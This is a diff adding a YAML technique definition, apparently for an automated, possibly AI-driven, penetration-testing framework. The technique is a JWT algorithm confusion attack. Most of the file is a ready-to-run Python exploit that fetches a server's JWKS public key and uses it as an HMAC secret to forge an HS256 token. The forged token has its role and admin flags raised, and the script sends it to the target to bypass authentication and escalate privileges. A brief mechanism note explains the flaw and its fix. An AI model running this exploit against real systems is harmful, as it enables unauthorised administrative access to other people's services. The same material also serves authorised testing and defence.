@@ -1,0 +1,107 @@
+name: jwt_alg_confusion
+category: web
+description: RS256→HS256 algorithm confusion attack — sign JWT with server's public key as HMAC secret
+preconditions:
+- auth_endpoint_known
+- jwt_token_found
+parameters:
+  target_url: from_engagement.target_url
+  token: from_finding.jwt_token
+  public_key_url: from_finding.jwks_uri
+command_template: >
+  python3 -c "
+  import base64, json, hmac, hashlib, urllib.request, sys, re
+
+  token = '{token}'
+  pub_url = '{public_key_url}'
+  target = '{target_url}'
+
+  parts = token.split('.')
+  if len(parts) != 3:
+      print('Invalid JWT format')
+      sys.exit(1)
+
+  # Decode header + payload
+  def b64d(s):
+      s += '=='*((4-len(s)%4)%4)
+      return base64.urlsafe_b64decode(s)
+
+  def b64e(b):
+      return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+  header = json.loads(b64d(parts[0]))
+  payload = json.loads(b64d(parts[1]))
+
+  print(f'Original alg: {header.get(\"alg\")}')
+  print(f'Original payload: {json.dumps(payload)[:200]}')
+
+  # Fetch public key (PEM) from JWKS endpoint
+  try:
+      with urllib.request.urlopen(pub_url, timeout=10) as r:
+          jwks = json.loads(r.read())
+      print(f'JWKS fetched: {len(jwks.get(\"keys\",[]))} keys')
+      pub_pem = None
+      for key in jwks.get('keys', []):
+          if key.get('kty') == 'RSA':
+              # Use jwt_tool or python-jose to export PEM
+              from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+              from cryptography.hazmat.primitives import serialization
+              import struct
+              def decode_int(b64):
+                  b = base64.urlsafe_b64decode(b64 + '==')
+                  return int.from_bytes(b, 'big')
+              n = decode_int(key['n'])
+              e = decode_int(key['e'])
+              pub_nums = RSAPublicNumbers(e, n)
+              pub_key = pub_nums.public_key()
+              pub_pem = pub_key.public_bytes(
+                  serialization.Encoding.PEM,
+                  serialization.PublicFormat.SubjectPublicKeyInfo
+              )
+              break
+
+      if pub_pem:
+          # Forge HS256 token signed with public key as HMAC secret
+          new_header = dict(header)
+          new_header['alg'] = 'HS256'
+          # Escalate privileges
+          payload['role'] = 'admin'
+          payload['admin'] = True
+          payload['is_admin'] = True
+
+          hdr_b64 = b64e(json.dumps(new_header, separators=(',',':')).encode())
+          pay_b64 = b64e(json.dumps(payload, separators=(',',':')).encode())
+          msg = f'{hdr_b64}.{pay_b64}'.encode()
+          sig = hmac.new(pub_pem, msg, hashlib.sha256).digest()
+          forged = f'{hdr_b64}.{pay_b64}.{b64e(sig)}'
+          print(f'FORGED_TOKEN: {forged}')
+
+          # Test forged token
+          req = urllib.request.Request(target,
+              headers={'Authorization': f'Bearer {forged}', 'Cookie': f'token={forged}'})
+          with urllib.request.urlopen(req, timeout=10) as r:
+              body = r.read().decode()[:500]
+          print(f'Response: {body}')
+      else:
+          print('No RSA key found in JWKS')
+  except Exception as ex:
+      print(f'Error: {ex}')
+  "
+parser: web_response_parser
+expected_effects:
+- jwt_forged
+- auth_bypass_achieved
+- privilege_escalated
+falsifier:
+  pattern: Invalid signature|Unauthorized|401|403|invalid token
+  timeout: 30
+model_tier: sonnet
+mechanism: >
+  Algorithm confusion: if server uses RS256 (asymmetric) but also accepts HS256, an attacker
+  can sign a token with the server's PUBLIC key used as an HMAC-SHA256 secret. The server
+  verifies using its public key — which matches. Requires: (1) server exposes public key via
+  JWKS endpoint, (2) server doesn't strictly enforce algorithm type. Fix: pin expected algorithm
+  in JWT verification, reject unknown alg values. Tool: jwt_tool -X k -pk public.pem
+hacktricks_ref: pentesting-web/hacking-jwt-json-web-tokens.md
+destructive: false
+opsec: low
